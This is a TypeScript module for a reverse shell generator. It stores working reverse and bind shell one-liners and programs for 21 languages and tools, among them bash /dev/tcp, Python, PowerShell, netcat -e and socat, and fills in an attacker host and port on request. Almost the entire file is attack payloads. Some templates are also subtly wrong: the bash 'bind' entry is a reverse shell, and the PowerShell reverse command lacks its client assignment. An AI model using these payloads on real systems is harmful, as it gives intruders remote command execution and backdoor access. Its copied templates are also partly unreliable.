// Reverse Shell Generator
// Generate reverse shells in various languages

import { ShellLanguage, ShellConfig, GeneratedShell, ShellType } from './types';

// Available shell languages with metadata
const shellLanguages: Array<{ id: ShellLanguage; name: string; platform: string }> = [
    { id: 'bash', name: 'Bash', platform: 'Linux/Unix' },
    { id: 'sh', name: 'POSIX Shell', platform: 'Linux/Unix' },
    { id: 'python', name: 'Python 2', platform: 'Cross-platform' },
    { id: 'python3', name: 'Python 3', platform: 'Cross-platform' },
    { id: 'perl', name: 'Perl', platform: 'Cross-platform' },
    { id: 'php', name: 'PHP', platform: 'Web servers' },
    { id: 'ruby', name: 'Ruby', platform: 'Cross-platform' },
    { id: 'powershell', name: 'PowerShell', platform: 'Windows' },
    { id: 'cmd', name: 'CMD', platform: 'Windows' },
    { id: 'netcat', name: 'Netcat (nc)', platform: 'Cross-platform' },
    { id: 'ncat', name: 'Ncat (nmap)', platform: 'Cross-platform' },
    { id: 'java', name: 'Java', platform: 'Cross-platform' },
    { id: 'groovy', name: 'Groovy', platform: 'Cross-platform' },
    { id: 'nodejs', name: 'Node.js', platform: 'Cross-platform' },
    { id: 'csharp', name: 'C#', platform: 'Windows/.NET' },
    { id: 'go', name: 'Go', platform: 'Cross-platform' },
    { id: 'rust', name: 'Rust', platform: 'Cross-platform' },
    { id: 'lua', name: 'Lua', platform: 'Cross-platform' },
    { id: 'awk', name: 'AWK', platform: 'Linux/Unix' },
    { id: 'telnet', name: 'Telnet', platform: 'Cross-platform' },
    { id: 'socat', name: 'Socat', platform: 'Cross-platform' }
];

/**
 * Get list of available shell languages
 */
export function getAvailableLanguages(): Array<{ id: ShellLanguage; name: string; platform: string }> {
    return shellLanguages;
}

/**
 * Generate shell templates based on language and configuration
 */
const shellTemplates: Record<ShellLanguage, { reverse: string; bind: string; listener: string; description: string }> = {
    bash: {
        reverse: `bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`,
        bind: `bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Bash reverse shell using /dev/tcp'
    },
    sh: {
        reverse: `sh -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1`,
        bind: `/bin/sh -i <&3 >&3 2>&3`,
        listener: `nc -lvnp {LPORT}`,
        description: 'POSIX shell reverse shell'
    },
    python: {
        reverse: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
        bind: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"]);'`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Python 2 reverse shell'
    },
    python3: {
        reverse: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`,
        bind: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{LPORT}));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);import pty;pty.spawn("/bin/bash");'`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Python 3 reverse shell with PTY'
    },
    perl: {
        reverse: `perl -e 'use Socket;$i="{LHOST}";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        bind: `perl -e 'use Socket;$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p,INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/sh -i");};'`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Perl reverse shell'
    },
    php: {
        reverse: `php -r '$sock=fsockopen("{LHOST}",{LPORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        bind: `php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",{LPORT});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'`,
        listener: `nc -lvnp {LPORT}`,
        description: 'PHP reverse shell'
    },
    ruby: {
        reverse: `ruby -rsocket -e'f=TCPSocket.open("{LHOST}",{LPORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
        bind: `ruby -rsocket -e'f=TCPServer.new({LPORT});s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Ruby reverse shell'
    },
    powershell: {
        reverse: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{LHOST}",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
        bind: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{LPORT});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`,
        listener: `nc -lvnp {LPORT}`,
        description: 'PowerShell reverse shell'
    },
    cmd: {
        reverse: `cmd /c "powershell -ep bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""`,
        bind: `cmd /c "start /b powershell -ep bypass -c \"$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',{LPORT});$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()\""`,
        listener: `nc -lvnp {LPORT}`,
        description: 'CMD with PowerShell reverse shell'
    },
    netcat: {
        reverse: `nc -e /bin/sh {LHOST} {LPORT}`,
        bind: `nc -lvnp {LPORT} -e /bin/sh`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Netcat reverse shell (requires -e support)'
    },
    ncat: {
        reverse: `ncat {LHOST} {LPORT} -e /bin/bash`,
        bind: `ncat -lvnp {LPORT} -e /bin/bash`,
        listener: `ncat -lvnp {LPORT}`,
        description: 'Ncat reverse shell'
    },
    java: {
        reverse: `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()`,
        bind: `// Java bind shell - typically requires compiled class`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Java runtime exec reverse shell'
    },
    groovy: {
        reverse: `String host="{LHOST}";
int port={LPORT};
String cmd="/bin/bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();`,
        bind: `// Groovy bind shell`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Groovy reverse shell'
    },
    nodejs: {
        reverse: `(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect({LPORT}, "{LHOST}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();`,
        bind: `require('child_process').exec('nc -lvnp {LPORT} -e /bin/sh')`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Node.js reverse shell'
    },
    csharp: {
        reverse: `using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.IO;

class Program {
    static void Main() {
        using(TcpClient client = new TcpClient("{LHOST}", {LPORT}))
        using(Stream stream = client.GetStream())
        using(StreamReader reader = new StreamReader(stream))
        using(StreamWriter writer = new StreamWriter(stream)) {
            writer.AutoFlush = true;
            while(true) {
                writer.Write("PS> ");
                string cmd = reader.ReadLine();
                if(cmd == "exit") break;
                Process p = new Process();
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.Arguments = "/c " + cmd;
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.RedirectStandardOutput = true;
                p.StartInfo.RedirectStandardError = true;
                p.Start();
                writer.Write(p.StandardOutput.ReadToEnd());
                writer.Write(p.StandardError.ReadToEnd());
            }
        }
    }
}`,
        bind: `// C# bind shell`,
        listener: `nc -lvnp {LPORT}`,
        description: 'C# reverse shell'
    },
    go: {
        reverse: `echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go`,
        bind: `// Go bind shell`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Go reverse shell'
    },
    rust: {
        reverse: `// Compile and run:
// rustc shell.rs -o shell && ./shell
use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

fn main() {
    let s = TcpStream::connect("{LHOST}:{LPORT}").unwrap();
    let fd = s.as_raw_fd();
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}`,
        bind: `// Rust bind shell`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Rust reverse shell'
    },
    lua: {
        reverse: `lua -e "require('socket');require('os');t=socket.tcp();t:connect('{LHOST}','{LPORT}');os.execute('/bin/sh -i <&3 >&3 2>&3');"`,
        bind: `// Lua bind shell`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Lua reverse shell using luasocket'
    },
    awk: {
        reverse: `awk 'BEGIN {s = "/inet/tcp/0/{LHOST}/{LPORT}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'`,
        bind: `awk 'BEGIN {s = "/inet/tcp/{LPORT}/0/0"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}'`,
        listener: `nc -lvnp {LPORT}`,
        description: 'AWK reverse shell'
    },
    telnet: {
        reverse: `rm -f /tmp/p; mknod /tmp/p p && telnet {LHOST} {LPORT} 0</tmp/p | /bin/sh 1>/tmp/p`,
        bind: `// Telnet bind shell`,
        listener: `nc -lvnp {LPORT}`,
        description: 'Telnet reverse shell using named pipe'
    },
    socat: {
        reverse: `socat TCP:{LHOST}:{LPORT} EXEC:/bin/sh,pty,stderr,setsid,sigint,sane`,
        bind: `socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane`,
        listener: `socat file:\`tty\`,raw,echo=0 TCP-LISTEN:{LPORT}`,
        description: 'Socat reverse shell with full TTY'
    }
};

/**
 * Generate a shell payload based on configuration
 */
export function generateShell(config: ShellConfig): GeneratedShell {
    const { language, type, lhost, lport } = config;

    const template = shellTemplates[language];
    if (!template) {
        throw new Error(`Unsupported shell language: ${language}`);
    }

    const shellType = type || 'reverse';
    const templateStr = shellType === 'reverse' ? template.reverse : template.bind;
    const listenerStr = template.listener;

    // Replace placeholders
    const payload = templateStr
        .replace(/{LHOST}/g, lhost)
        .replace(/{LPORT}/g, String(lport));

    const listener = listenerStr
        .replace(/{LHOST}/g, lhost)
        .replace(/{LPORT}/g, String(lport));

    return {
        payload,
        language,
        type: shellType,
        description: template.description,
        listener,
        raw: templateStr
    };
}

/**
 * Get shell template info for a specific language
 */
export function getShellTemplate(language: ShellLanguage): typeof shellTemplates[ShellLanguage] | undefined {
    return shellTemplates[language];
}

/**
 * Check if a language supports bind shells
 */
export function supportsBind(language: ShellLanguage): boolean {
    const template = shellTemplates[language];
    return template && !template.bind.startsWith('//');
}

export default {
    generateShell,
    getAvailableLanguages,
    getShellTemplate,
    supportsBind
};
